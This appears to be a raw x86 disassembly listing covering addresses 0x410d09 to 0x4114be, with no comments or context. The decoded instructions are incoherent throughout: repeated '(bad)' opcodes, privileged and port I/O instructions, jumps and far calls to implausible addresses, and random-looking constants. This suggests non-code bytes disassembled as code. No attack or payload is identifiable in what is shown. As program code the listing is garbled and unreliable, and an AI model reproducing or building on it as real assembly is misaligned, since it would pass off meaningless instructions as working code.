  410d09:	imul   edi,DWORD PTR [ebx-0x12cab405],0x29
  410d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d11:	retf   
  410d12:	adc    BYTE PTR ss:[eax-0x72],0x33
  410d17:	ret    0xcd97
  410d1a:	push   ss
  410d1b:	or     bh,BYTE PTR [edx+ebx*2-0x67460b62]
  410d22:	add    eax,0xe60f5012
  410d27:	pushf  
  410d28:	xchg   edx,eax
  410d29:	stos   DWORD PTR es:[edi],eax
  410d2a:	sbb    BYTE PTR [esi+0x3c6e9359],bl
  410d30:	mov    ch,0x1b
  410d32:	test   BYTE PTR [edx],cl
  410d34:	mov    dh,0xda
  410d36:	test   ch,ch
  410d38:	shl    BYTE PTR [edx+edi*2],1
  410d3b:	fwait
  410d3c:	inc    BYTE PTR [eax-0x5bfb80c0]
  410d42:	dec    ecx
  410d43:	lea    ebp,[ebp+0x75]
  410d46:	out    0xd7,eax
  410d48:	ja     0x410d2a
  410d4a:	into   
  410d4b:	shr    esi,1
  410d4d:	jl     0x410d1b
  410d4f:	inc    ebp
  410d50:	xor    eax,0xfc02d990
  410d55:	fisubr DWORD PTR [esp+ebp*1+0x6ce4ee40]
  410d5c:	(bad)  
  410d5d:	arpl   WORD PTR ds:0x39acdf07,bp
  410d63:	push   edi
  410d64:	pop    es
  410d65:	dec    edx
  410d66:	xchg   esi,eax
  410d67:	aad    0xd8
  410d69:	(bad)  
  410d6a:	push   ecx
  410d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d6c:	or     cl,BYTE PTR [edi-0x73c74d29]
  410d72:	dec    eax
  410d73:	in     al,dx
  410d74:	inc    esi
  410d75:	outs   dx,BYTE PTR ds:[esi]
  410d76:	cmp    BYTE PTR [esi],cl
  410d78:	addr16 (bad) 
  410d7a:	xchg   esp,eax
  410d7b:	popa   
  410d7c:	pop    ss
  410d7d:	daa    
  410d7e:	push   ebp
  410d7f:	push   ebp
  410d80:	addr16 call 0xebc3f856
  410d86:	sub    DWORD PTR [ebp+0x7564be6b],ebp
  410d8c:	pop    es
  410d8d:	ret    
  410d8e:	retf   
  410d8f:	xchg   DWORD PTR [edx],ebx
  410d91:	mov    cs,WORD PTR [ebp+0x74]
  410d94:	mov    eax,0x936f342
  410d99:	sub    eax,0x6e1f88ff
  410d9e:	hlt    
  410d9f:	sbb    ch,BYTE PTR [eax-0x5097eae4]
  410da5:	fisub  WORD PTR [eax-0x1af3f81f]
  410dab:	mov    ds:0x3a65ca19,al
  410db0:	dec    ebx
  410db1:	adc    al,0x8
  410db3:	sahf   
  410db4:	es loope 0x410d39
  410db7:	jecxz  0x410e16
  410db9:	daa    
  410dba:	repz (bad) 
  410dbc:	sbb    eax,0x53af5a9c
  410dc1:	pop    edi
  410dc2:	push   ebp
  410dc3:	add    al,0x80
  410dc5:	dec    ecx
  410dc6:	push   0xc0091602
  410dcb:	mov    dh,0xa3
  410dcd:	ins    DWORD PTR es:[edi],dx
  410dce:	fistp  QWORD PTR [esi]
  410dd0:	mov    DWORD PTR [ecx],ebx
  410dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dd3:	push   edx
  410dd4:	push   ecx
  410dd5:	sti    
  410dd6:	leave  
  410dd7:	xor    eax,0x76597ce
  410ddc:	loope  0x410e28
  410dde:	fldcw  WORD PTR [esi-0x4c1d32d1]
  410de4:	jmp    0x7a74373e
  410de9:	xchg   esi,eax
  410dea:	sti    
  410deb:	inc    ebx
  410dec:	in     eax,dx
  410ded:	retf   
  410dee:	inc    esi
  410def:	cmp    eax,0xfe410501
  410df4:	mov    dl,BYTE PTR [esi]
  410df6:	jp     0x410dae
  410df8:	add    ch,0xaf
  410dfb:	inc    esi
  410dfc:	(bad)  
  410dfd:	test   ebp,0xa19001ee
  410e03:	mov    ebx,0x8ee33402
  410e08:	add    BYTE PTR [edx+0x57],0xd
  410e0c:	mov    esi,0xbaca4a64
  410e11:	into   
  410e12:	and    edx,DWORD PTR [ebp+0x7eb36b91]
  410e18:	mov    BYTE PTR [ebx],dh
  410e1a:	div    BYTE PTR ds:0x90628fe7
  410e20:	push   esi
  410e21:	mov    eax,0xf0212dfe
  410e26:	leave  
  410e27:	pop    edx
  410e28:	push   ecx
  410e29:	mov    WORD PTR fs:[edi-0x46],es
  410e2d:	mov    dl,0x9c
  410e2f:	sub    BYTE PTR [eax-0x1b],0xe8
  410e33:	inc    ebp
  410e34:	stos   BYTE PTR es:[edi],al
  410e35:	pop    edi
  410e36:	clc    
  410e37:	sar    BYTE PTR [ebx+0x53],0x2b
  410e3b:	xchg   edx,eax
  410e3c:	in     eax,0x10
  410e3e:	dec    BYTE PTR [esi-0x449f395e]
  410e44:	and    dh,bh
  410e46:	add    eax,0x41e2db76
  410e4b:	mov    esi,0xa74b9c1e
  410e50:	dec    esi
  410e51:	jg     0x410e39
  410e53:	adc    ch,BYTE PTR [eax+ebx*1]
  410e56:	push   eax
  410e57:	and    dl,al
  410e59:	les    ebp,FWORD PTR [edi]
  410e5b:	fiadd  DWORD PTR [ecx+esi*4]
  410e5e:	pushf  
  410e5f:	hlt    
  410e60:	stos   DWORD PTR es:[edi],eax
  410e61:	icebp  
  410e62:	xor    ecx,ebp
  410e64:	ins    DWORD PTR es:[edi],dx
  410e65:	imul   esp,DWORD PTR [eax],0xffffffd9
  410e68:	mov    al,0xb2
  410e6a:	sub    al,0x80
  410e6c:	loop   0x410e11
  410e6e:	call   0xea65:0xd34aca65
  410e75:	mov    fs,WORD PTR [edi+0x6c54fbdf]
  410e7b:	dec    ecx
  410e7d:	fiadd  DWORD PTR [ecx-0x35]
  410e80:	rcl    eax,1
  410e82:	scas   eax,DWORD PTR es:[edi]
  410e83:	xchg   esp,eax
  410e84:	popa   
  410e85:	lock pop ds
  410e87:	dec    ebp
  410e88:	retf   
  410e89:	lds    edi,FWORD PTR [edx+0x298b3e07]
  410e8f:	adc    eax,0x3bd0f022
  410e94:	popf   
  410e95:	pushf  
  410e96:	mov    eax,ds:0xfc177d74
  410e9b:	cmc    
  410e9c:	pop    ebp
  410e9d:	out    0x3d,al
  410e9f:	ins    DWORD PTR es:[edi],dx
  410ea0:	inc    ebp
  410ea1:	push   edi
  410ea2:	enter  0xc16a,0x2e
  410ea6:	mov    ebx,0xb17ec6bd
  410eab:	or     eax,0x6227e1a
  410eb0:	je     0x410e55
  410eb2:	nop
  410eb3:	or     BYTE PTR [ecx],dl
  410eb5:	pop    ebp
  410eb6:	loopne 0x410f37
  410eb8:	mov    esp,0xd5c7c078
  410ebd:	dec    esp
  410ebe:	(bad)
  410ec2:	in     al,dx
  410ec3:	sub    DWORD PTR [edi],eax
  410ec5:	adc    BYTE PTR [esi-0x438f8a2d],ah
  410ecb:	es sub esp,0x890bb98c
  410ed2:	jno    0x410e67
  410ed4:	jno    0x410eef
  410ed6:	push   cs
  410ed7:	pushf  
  410ed8:	and    ah,BYTE PTR [edi-0x7db1b60c]
  410ede:	and    al,0x37
  410ee0:	out    0x12,eax
  410ee2:	mov    al,0x78
  410ee4:	mov    cl,ah
  410ee6:	jne    0x410f3c
  410ee8:	jne    0x410f04
  410eea:	sub    BYTE PTR [edx+0x65],ah
  410eed:	sub    BYTE PTR [edi],cl
  410eef:	pop    esp
  410ef0:	mov    eax,0xdecd5469
  410ef5:	int3   
  410ef6:	sub    ebp,ebp
  410ef8:	fidiv  DWORD PTR [eax+0x68c5e91c]
  410efe:	mov    ecx,DWORD PTR [eax]
  410f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f01:	scas   al,BYTE PTR es:[edi]
  410f02:	push   ebp
  410f03:	push   edx
  410f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f05:	(bad)  
  410f06:	jl     0x410f54
  410f08:	fcom   DWORD PTR [edi]
  410f0a:	out    dx,al
  410f0b:	push   DWORD PTR [edx-0x6d84b50e]
  410f11:	into   
  410f12:	imul   esp,DWORD PTR [edx+0x48],0x72
  410f16:	add    DWORD PTR ds:0xcca9066d,0x593bc018
  410f20:	adc    cl,bh
  410f22:	adc    al,0xcb
  410f24:	aad    0xe7
  410f26:	fs jb  0x410f0e
  410f29:	pop    ss
  410f2a:	loop   0x410f34
  410f2c:	mov    WORD PTR [edx],ss
  410f2e:	fucomp st(3)
  410f30:	jg     0x410f7c
  410f32:	enter  0x2e04,0xc4
  410f36:	jecxz  0x410f74
  410f38:	pop    es
  410f39:	xchg   DWORD PTR [edi-0x70],esp
  410f3c:	push   cs
  410f3d:	inc    ebx
  410f3e:	cli    
  410f3f:	inc    ecx
  410f40:	loopne 0x410f42
  410f42:	popf   
  410f43:	int    0xde
  410f45:	pop    edx
  410f46:	out    dx,al
  410f47:	jmp    0x410fbc
  410f49:	icebp  
  410f4a:	dec    edi
  410f4b:	push   es
  410f4c:	pop    edi
  410f4d:	test   al,0xd1
  410f4f:	push   ebx
  410f50:	xor    esi,DWORD PTR [ecx-0x13]
  410f53:	sbb    ch,BYTE PTR [esi+ebp*4+0x9d23d5]
  410f5a:	cmp    al,0x5b
  410f5c:	jnp    0x410f69
  410f5e:	push   ebx
  410f5f:	test   DWORD PTR [esi-0x7d68a975],0x10bfa205
  410f69:	push   0x66
  410f6b:	adc    al,0xb4
  410f6d:	(bad)  
  410f6e:	dec    edx
  410f6f:	and    eax,0x73c7c8b4
  410f74:	dec    cl
  410f76:	inc    ecx
  410f77:	push   esi
  410f78:	std    
  410f79:	and    cl,0x1f
  410f7c:	mov    edx,DWORD PTR [edx+0x63]
  410f7f:	and    DWORD PTR [esi+0x13],esp
  410f82:	in     eax,0xce
  410f84:	sbb    ebp,DWORD PTR [edi+0x24b14098]
  410f8a:	rcr    ebp,1
  410f8c:	loopne 0x410f9a
  410f8e:	xor    eax,0x2bb9232d
  410f93:	es adc al,0xc4
  410f96:	dec    esp
  410f97:	test   esi,0x5e40ca7b
  410f9d:	mov    esi,0x821ce4b4
  410fa2:	xchg   edx,eax
  410fa3:	pop    esi
  410fa4:	cmp    eax,0xd9dc54a4
  410fa9:	xchg   ecx,eax
  410faa:	sub    edi,DWORD PTR [ebp-0x3]
  410fad:	push   esi
  410fae:	mov    ds:0x9171d7d7,eax
  410fb3:	loopne 0x410f83
  410fb5:	jnp    0x410fe3
  410fb7:	xchg   esp,eax
  410fb8:	cmp    al,BYTE PTR [esi+0x5c]
  410fbb:	sub    al,0xa9
  410fbd:	lahf   
  410fbe:	loop   0x410fdd
  410fc0:	mov    dh,BYTE PTR [ebx+0xccaa6b2]
  410fc6:	(bad)  
  410fc7:	push   ebp
  410fc8:	mov    ah,0x33
  410fca:	in     al,0x12
  410fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fcd:	cli    
  410fce:	in     eax,0x60
  410fd0:	dec    ebp
  410fd1:	fisub  DWORD PTR [ebx+0x7b]
  410fd4:	jne    0x410ffc
  410fd6:	push   ebx
  410fd7:	jmp    DWORD PTR [ebx+0x63efcabd]
  410fdd:	push   eax
  410fde:	pop    ss
  410fdf:	(bad)  
  410fe1:	in     al,dx
  410fe2:	out    0xf1,eax
  410fe4:	cld    
  410fe5:	lock (bad) 
  410fe7:	fcmovnb st,st(0)
  410fe9:	sar    DWORD PTR [ebx+ebp*1],cl
  410fec:	push   0xbacc57b8
  410ff1:	cwde   
  410ff2:	mov    ch,0x4a
  410ff4:	je     0x410fd5
  410ff6:	mov    ah,0x2e
  410ff8:	push   0x33
  410ffa:	lock and BYTE PTR [ebx+0x6bbfce5e],ah
  411001:	(bad)  
  411002:	out    dx,eax
  411003:	stc    
  411004:	add    eax,0xa2d6c57d
  411009:	cwde   
  41100a:	lods   al,BYTE PTR ds:[esi]
  41100b:	cs push ebp
  41100d:	out    dx,al
  41100e:	adc    DWORD PTR [esi],ecx
  411010:	rol    BYTE PTR [edi],1
  411012:	jmp    0x410f9c
  411014:	imul   esi,DWORD PTR [ebx],0x74
  411017:	sbb    BYTE PTR [esp+ebx*8-0x67],dl
  41101b:	loopne 0x410fc4
  41101d:	pop    esi
  41101e:	xchg   edx,eax
  41101f:	dec    ecx
  411020:	scas   al,BYTE PTR es:[edi]
  411021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411022:	fstp   QWORD PTR [ecx]
  411024:	std    
  411025:	push   0xffffffa7
  411027:	lods   eax,DWORD PTR ds:[esi]
  411028:	js     0x41106a
  41102a:	lods   al,BYTE PTR ds:[esi]
  41102b:	xchg   BYTE PTR [ecx+0x21],dh
  41102e:	xchg   ecx,eax
  41102f:	mov    dh,0x8b
  411031:	data16 or al,0x80
  411034:	dec    ecx
  411035:	xchg   edi,eax
  411036:	test   al,0xbc
  411039:	xchg   edx,eax
  41103a:	jno    0x41106d
  41103c:	and    DWORD PTR [ebx+0x6e8359a1],edi
  411042:	mov    ecx,0xcea465c9
  411047:	hlt    
  411048:	lods   eax,DWORD PTR ds:[esi]
  411049:	ja     0x411033
  41104b:	repnz sbb ebx,DWORD PTR [eax]
  41104e:	cs xchg ebx,eax
  411050:	inc    esp
  411051:	call   0x14d2:0x4c7688bf
  411058:	mov    cl,0x3a
  41105a:	sbb    al,0x25
  41105c:	jae    0x41103e
  41105e:	aaa    
  41105f:	int    0x8c
  411061:	hlt    
  411062:	imul   DWORD PTR [esi+0x5d780d1d]
  411068:	int    0x60
  41106a:	repz adc ch,BYTE PTR [edi+ebx*4+0x38571fbb]
  411072:	mov    edi,0xc8046fe9
  411077:	icebp  
  411078:	sbb    BYTE PTR [ecx],0xb0
  41107b:	cmp    DWORD PTR [esi],edx
  41107d:	enter  0x5798,0x4c
  411081:	mov    esi,0x98b0eba7
  411086:	sbb    BYTE PTR [edi],0x6d
  411089:	rol    BYTE PTR [ecx-0x2ec064db],0x43
  411090:	push   cx
  411092:	das    
  411093:	push   ecx
  411094:	and    DWORD PTR [esi+0x1],0x28
  411098:	dec    edx
  411099:	dec    esp
  41109a:	jmp    0x4110bf
  41109c:	jg     0x411044
  41109e:	cli    
  41109f:	xchg   edi,eax
  4110a0:	cdq    
  4110a1:	xchg   ebp,edx
  4110a3:	jbe    0x4110aa
  4110a5:	jbe    0x411048
  4110a7:	hlt    
  4110a8:	div    DWORD PTR [edx]
  4110aa:	dec    esp
  4110ab:	jnp    0x411043
  4110ad:	ins    BYTE PTR es:[edi],dx
  4110ae:	sub    dh,ah
  4110b0:	pop    edx
  4110b1:	int3   
  4110b2:	shl    DWORD PTR gs:[ebp-0x313312e8],1
  4110b9:	dec    ebp
  4110ba:	scas   al,BYTE PTR es:[edi]
  4110bb:	and    DWORD PTR [edx-0x37],0x30a49ccc
  4110c2:	inc    esi
  4110c3:	fs je  0x411093
  4110c6:	dec    esi
  4110c7:	xlat   BYTE PTR es:[ebx]
  4110c9:	mov    ebx,0x18a3282b
  4110ce:	inc    esi
  4110cf:	(bad)  
  4110d0:	pop    ds
  4110d1:	cmp    ecx,DWORD PTR [ecx-0x5e]
  4110d4:	lods   eax,DWORD PTR ds:[esi]
  4110d5:	push   cs
  4110d6:	imul   esp,ecx,0x993ea6a
  4110dc:	fist   DWORD PTR [ebx+0x15]
  4110df:	stos   DWORD PTR es:[edi],eax
  4110e0:	sub    eax,0xff3abf00
  4110e6:	(bad)  
  4110e7:	out    0x6,al
  4110e9:	sub    cl,BYTE PTR [edi+edi*4+0x773c64f5]
  4110f0:	or     BYTE PTR [edi+0x3a],0x2d
  4110f4:	xor    DWORD PTR [edi-0x6ecadb81],0xffffff8f
  4110fb:	rol    DWORD PTR [ecx+0x11abbacc],1
  411101:	sub    edi,DWORD PTR [eax-0x61]
  411104:	cli    
  411105:	adc    ch,BYTE PTR [ebx-0x7]
  411108:	hlt    
  411109:	hlt    
  41110a:	push   edx
  41110b:	aas    
  41110c:	stos   DWORD PTR es:[edi],eax
  41110d:	int3   
  41110e:	adc    BYTE PTR [edi+0x1],dl
  411111:	sbb    DWORD PTR ds:0x647b9ac7,eax
  411117:	push   ss
  411118:	arpl   WORD PTR [eax-0x71],ax
  41111b:	sti    
  41111c:	jbe    0x41119c
  41111e:	int    0xbc
  411120:	adc    bh,ah
  411122:	shl    dh,cl
  411124:	and    esi,DWORD PTR [eax]
  411126:	and    eax,0xb570bf34
  41112b:	rep stos DWORD PTR es:[edi],eax
  41112d:	or     DWORD PTR [esi],0x2757d4e6
  411133:	ins    DWORD PTR es:[edi],dx
  411134:	loopne 0x41119c
  411136:	adc    ecx,ebp
  411138:	xor    DWORD PTR [edi+0x433577ae],edi
  41113e:	rcl    DWORD PTR [esi],1
  411140:	stc    
  411141:	retf   
  411142:	ins    DWORD PTR es:[edi],dx
  411143:	inc    esp
  411144:	sbb    al,BYTE PTR [esi]
  411146:	cmp    edx,edx
  411148:	div    DWORD PTR [edx]
  41114a:	daa    
  41114b:	xchg   ebx,eax
  41114c:	das    
  41114d:	ds xchg ecx,eax
  41114f:	lods   eax,DWORD PTR ds:[esi]
  411150:	push   ss
  411151:	sub    al,BYTE PTR [esi-0x64]
  411154:	xor    dl,BYTE PTR ds:0x46a79aa8
  41115a:	rcr    ebx,0xa1
  41115d:	icebp  
  41115e:	enter  0x3ba6,0xaa
  411162:	xchg   esi,eax
  411163:	jno    0x411161
  411165:	mov    ?,eax
  411167:	push   ecx
  411168:	es sub edi,edi
  41116b:	jb     0x411157
  41116d:	or     BYTE PTR [ebp+0xd65cb0],0xca
  411174:	dec    edx
  411175:	xchg   esi,eax
  411176:	ds xor dl,al
  411179:	dec    esp
  41117a:	or     BYTE PTR [ebx],ch
  41117c:	mov    bl,0x3e
  41117e:	cs idiv dl
  411181:	(bad)  
  411183:	js     0x4111c7
  411185:	and    BYTE PTR [ebp-0x426ba3b4],al
  41118b:	dec    edx
  41118c:	(bad)  
  41118d:	mov    ch,0xb3
  41118f:	add    eax,ecx
  411191:	fld    QWORD PTR [esi+eiz*2+0x6a]
  411195:	jae    0x4111ab
  411197:	xchg   edi,eax
  411198:	or     eax,0x7d6840f1
  41119d:	jae    0x4111fe
  41119f:	pop    edx
  4111a0:	je     0x411139
  4111a2:	sbb    eax,0x2b18fed9
  4111a7:	add    al,0x93
  4111a9:	dec    eax
  4111aa:	call   0xf0660ee6
  4111af:	cmp    BYTE PTR [edi-0x1e],0x2d
  4111b3:	mov    al,0x4c
  4111b5:	xor    al,0x71
  4111b7:	test   BYTE PTR [ecx-0x7cbdb9e2],bl
  4111bd:	sub    bl,BYTE PTR [eax+ecx*2]
  4111c0:	sti    
  4111c1:	jno    0x4111c9
  4111c3:	fnstsw WORD PTR [ebx]
  4111c5:	scas   al,BYTE PTR es:[edi]
  4111c6:	xor    eax,0x8702aad8
  4111cb:	rol    DWORD PTR [ebx+0x3f],cl
  4111ce:	inc    ebp
  4111cf:	mov    edx,0xeb1f9e83
  4111d4:	and    al,0x71
  4111d6:	inc    eax
  4111d7:	int3   
  4111d8:	cmp    esp,DWORD PTR [eax+0x79]
  4111db:	loopne 0x4111df
  4111dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111de:	pop    esp
  4111df:	pushf  
  4111e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e1:	xor    eax,0x6ceee3d1
  4111e6:	mov    ebx,0xecf56e98
  4111eb:	mov    ecx,0x99a95343
  4111f0:	sbb    BYTE PTR [edi-0x60],bl
  4111f3:	add    al,BYTE PTR [edi+0x13]
  4111f6:	sub    BYTE PTR [ecx+0x270c0eab],cl
  4111fc:	inc    esp
  4111fd:	test   ebx,edi
  4111ff:	xchg   BYTE PTR [eax],dh
  411201:	fimul  DWORD PTR [ebx-0x77698ee6]
  411207:	and    ebx,DWORD PTR [edi-0x6dec8395]
  41120d:	fisttp QWORD PTR [esi]
  41120f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411210:	mov    dl,0xbd
  411212:	retf   0xbbb4
  411215:	lods   eax,DWORD PTR ds:[esi]
  411216:	adc    DWORD PTR [ecx-0x4b8271bf],ebx
  41121c:	xor    edi,ecx
  41121e:	pop    eax
  41121f:	push   edi
  411220:	add    eax,0x82001239
  411225:	mov    edi,0x480aaefc
  41122a:	pop    ebp
  41122b:	jge    0x4111ba
  41122d:	xchg   edi,eax
  41122e:	int3   
  41122f:	or     edx,DWORD PTR [esi-0x7506b8ad]
  411235:	aas    
  411236:	cmp    BYTE PTR [edi],al
  411238:	(bad)  
  411239:	retf   
  41123a:	popf   
  41123b:	or     al,0xba
  41123d:	ins    DWORD PTR es:[edi],dx
  41123e:	fild   QWORD PTR [eax+0x43]
  411241:	mov    ah,0xce
  411243:	sub    ecx,edx
  411245:	xor    dl,BYTE PTR [esi+edx*4-0x6f83d125]
  41124c:	push   ecx
  41124d:	icebp  
  41124e:	ins    BYTE PTR es:[edi],dx
  41124f:	rcl    BYTE PTR [ecx+0x33e7de42],0x5c
  411256:	mov    WORD PTR [ecx+0x32d5a6a1],ss
  41125c:	mov    cl,0x8d
  41125e:	mov    bh,0xe4
  411260:	cmc    
  411261:	sbb    bl,dl
  411263:	jae    0x4112ca
  411265:	ret    
  411266:	retf   0xb5b2
  411269:	sbb    dh,BYTE PTR [ebp+0x37569ae]
  41126f:	repz loopne 0x41128f
  411272:	sbb    edx,DWORD PTR [eax]
  411274:	lahf   
  411275:	or     eax,0x7aa0a936
  41127a:	xor    eax,0xedc1f581
  41127f:	sbb    DWORD PTR [ecx+0x6ed42c34],ebx
  411285:	xor    cl,BYTE PTR ds:[edx+ebx*1-0x77]
  41128a:	jg     0x411290
  41128c:	push   cs
  41128d:	es inc ebx
  41128f:	pushf  
  411290:	sbb    dl,cl
  411292:	adc    al,0x22
  411294:	mov    al,0x3b
  411296:	cmp    dl,BYTE PTR [eax+0x33]
  411299:	sub    al,0xaa
  41129b:	aad    0xa
  41129d:	cli    
  41129e:	mov    ah,0x4a
  4112a0:	jp     0x411240
  4112a2:	push   eax
  4112a3:	loopne 0x411250
  4112a5:	mov    ebx,0xf9653e6a
  4112aa:	cmc    
  4112ab:	push   eax
  4112ac:	mov    dl,0x75
  4112ae:	ror    DWORD PTR [ecx+0x11c418bc],cl
  4112b4:	inc    edx
  4112b5:	mov    ebx,0xfce7ec99
  4112ba:	sbb    DWORD PTR [ebx-0x2cbe3f49],0x21222a8d
  4112c4:	arpl   bp,cx
  4112c6:	push   0xfffffff1
  4112c8:	or     BYTE PTR [ecx+0x26],ah
  4112cb:	sysret 
  4112cd:	ret    
  4112ce:	mov    eax,ds:0xe2a6bae
  4112d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d4:	jle    0x41126c
  4112d6:	add    DWORD PTR [edx],ecx
  4112d8:	mov    al,ds:0x20afe6c7
  4112dd:	push   esp
  4112de:	jge    0x411296
  4112e0:	fidivr DWORD PTR [edx-0x7]
  4112e3:	mov    eax,0x7619a5bc
  4112e8:	sbb    dh,bh
  4112ea:	iret   
  4112eb:	nop
  4112ec:	rol    BYTE PTR ds:0x68a233df,1
  4112f2:	and    ah,BYTE PTR [eax]
  4112f4:	les    ebx,FWORD PTR [ecx+0x41]
  4112f7:	push   cs
  4112f8:	leave  
  4112f9:	jne    0x411359
  4112fb:	hlt    
  4112fc:	ds pushf 
  4112fe:	cmc    
  4112ff:	stc    
  411300:	imul   esi,DWORD PTR [ebp+0x694b1519],0x392ad882
  41130a:	sbb    DWORD PTR [ebx],esi
  41130c:	or     eax,0x789265ec
  411311:	les    edx,FWORD PTR [ebp-0x456c4020]
  411317:	pop    ebp
  411318:	jecxz  0x411300
  41131a:	nop
  41131b:	sbb    al,0x4
  41131d:	daa    
  41131e:	cmp    BYTE PTR [eax],ah
  411320:	jp     0x4112bd
  411322:	xsaves [ecx]
  411325:	lahf   
  411326:	aam    0x13
  411328:	arpl   WORD PTR [edx],ax
  41132a:	mov    ah,0x7e
  41132c:	adc    edi,ebx
  41132e:	xor    al,0x5f
  411330:	push   0xce65473c
  411335:	adc    ebp,DWORD PTR [ebp+0xb8d758a]
  41133b:	push   ds
  41133c:	rcl    DWORD PTR [edi],cl
  41133e:	push   cs
  41133f:	sub    eax,0xfca777fd
  411344:	and    ch,BYTE PTR [esi]
  411346:	test   eax,0x189d46a3
  41134b:	mov    DWORD PTR [edx],0x9394e541
  411351:	pop    ss
  411352:	addr16 xor eax,0x6095d7e5
  411358:	pusha  
  411359:	fsub   DWORD PTR [ecx+edx*2]
  41135c:	int    0x6d
  41135e:	test   DWORD PTR [edi],esi
  411360:	pusha  
  411361:	mov    eax,ds:0xff2ab7cb
  411366:	pop    eax
  411367:	(bad)  
  411368:	retf   
  411369:	jecxz  0x41139a
  41136b:	sbb    bh,BYTE PTR [ecx]
  41136d:	fcomi  st,st(4)
  41136f:	call   0xf3d2f578
  411374:	mov    ah,0x9
  411376:	ret    0x46de
  411379:	jb     0x4113ee
  41137b:	lahf   
  41137c:	ins    BYTE PTR es:[edi],dx
  41137d:	jb     0x41138a
  41137f:	mov    al,0xf8
  411381:	xor    al,0x37
  411383:	das    
  411384:	cmp    DWORD PTR [edx-0x1d],0x5c
  411388:	adc    ebp,DWORD PTR [ebp+0x30e52e87]
  41138e:	and    eax,0xcc164992
  411393:	inc    eax
  411394:	xchg   esp,eax
  411395:	xchg   ebp,eax
  411396:	jae    0x411320
  411398:	mov    eax,ds:0x34d46b94
  41139d:	(bad)  
  41139f:	das    
  4113a0:	loop   0x411415
  4113a2:	dec    esi
  4113a3:	adc    eax,DWORD PTR [ecx-0x48ce6ef8]
  4113a9:	repnz sbb esi,eax
  4113ac:	or     eax,0xe648635b
  4113b1:	push   0x9082ee61
  4113b6:	scas   al,BYTE PTR es:[edi]
  4113b7:	stc    
  4113b8:	(bad)  [esi+0xe]
  4113bb:	inc    ebx
  4113bc:	jno    0x41135a
  4113be:	pop    es
  4113bf:	push   0x34e669c8
  4113c4:	inc    edi
  4113c5:	pop    ds
  4113c6:	sub    dl,cl
  4113c8:	push   ss
  4113c9:	mov    ?,WORD PTR [edx-0x6f]
  4113cc:	cmp    ebp,DWORD PTR [ebx+ebp*8]
  4113cf:	mov    edi,0x27b556fc
  4113d4:	imul   ebx,DWORD PTR [esi+ebx*1-0x556e188c],0xffffffb5
  4113dc:	fs addr16 push 0x69cb5e86
  4113e3:	mov    bl,0xb9
  4113e5:	dec    ebp
  4113e6:	xor    al,0xb4
  4113e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113e9:	out    0xbf,eax
  4113eb:	sbb    BYTE PTR [edx+0x7b1165d7],bl
  4113f1:	(bad)  
  4113f3:	or     DWORD PTR [edi+0x5],0xffffffa0
  4113f7:	fld    DWORD PTR [edx-0x166fad1e]
  4113fd:	mov    ah,BYTE PTR [esi+0x5ef93353]
  411403:	or     BYTE PTR [esi+0x5d91a2d0],dl
  411409:	bound  ebp,QWORD PTR [ebx-0x5b56a549]
  41140f:	jmp    ecx
  411411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411412:	cdq    
  411413:	adc    DWORD PTR [esi+0x598121eb],edi
  411419:	loope  0x4113ad
  41141b:	or     esi,DWORD PTR [edi+0x5b]
  41141e:	ins    BYTE PTR es:[edi],dx
  41141f:	stos   DWORD PTR es:[edi],eax
  411420:	mov    edi,0xfcb58891
  411425:	mov    ds:0xbec46a20,al
  41142a:	(bad)  
  41142b:	div    BYTE PTR [edx+edi*8+0x56a20179]
  411432:	inc    ebp
  411433:	cmp    al,0x91
  411435:	jmp    FWORD PTR [edx+0x7f]
  411438:	sbb    eax,0x2eb8d5ea
  41143d:	leave  
  41143e:	(bad)  [edi+0x10]
  411441:	sub    ebp,esp
  411443:	lods   eax,DWORD PTR ds:[esi]
  411444:	push   eax
  411445:	xor    esi,DWORD PTR [edx-0x47]
  411448:	mov    ds:0x9044e96d,eax
  41144d:	icebp  
  41144e:	sbb    ebx,esp
  411450:	xchg   ecx,eax
  411451:	and    bl,bh
  411453:	ror    ch,cl
  411455:	sbb    ebx,DWORD PTR [ebx]
  411457:	cmp    ebx,DWORD PTR [ebx]
  411459:	xchg   esp,eax
  41145a:	jecxz  0x41141b
  41145c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41145d:	inc    ebp
  41145e:	fcomp  DWORD PTR ds:[edx-0x3503ee94]
  411465:	mov    cl,0xcf
  411467:	lahf   
  411468:	push   0xdd4e0374
  41146d:	ins    BYTE PTR es:[edi],dx
  41146e:	(bad)  
  41146f:	adc    BYTE PTR [ebx-0x387d790e],al
  411475:	mov    al,ah
  411477:	sti    
  411478:	aad    0x71
  41147a:	repz hlt 
  41147c:	mov    eax,0x73420d3d
  411481:	imul   esi,DWORD PTR [edi+edi*1],0xffffff88
  411485:	std    
  411486:	nop
  411487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411488:	ins    DWORD PTR es:[edi],dx
  411489:	xchg   edi,eax
  41148a:	xchg   ecx,eax
  41148b:	sti    
  41148c:	sahf   
  41148d:	repnz push eax
  41148f:	xchg   ecx,eax
  411490:	add    edx,eax
  411492:	(bad)  
  411493:	mov    gs:0x95894a73,eax
  411499:	adc    al,BYTE PTR [ecx]
  41149b:	aaa    
  41149c:	or     edx,edx
  41149e:	out    0xcb,al
  4114a0:	push   ecx
  4114a1:	pop    edx
  4114a2:	scas   eax,DWORD PTR es:[edi]
  4114a3:	cs ret 0x9d09
  4114a7:	xor    dl,cl
  4114a9:	loope  0x411446
  4114ab:	push   edi
  4114ac:	mov    edi,0x940fb14d
  4114b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b2:	sti    
  4114b3:	sar    bh,0xeb
  4114b6:	lahf   
  4114b7:	imul   DWORD PTR [ecx]
  4114b9:	mov    ebp,0x82921b86
  4114be:	aaa    
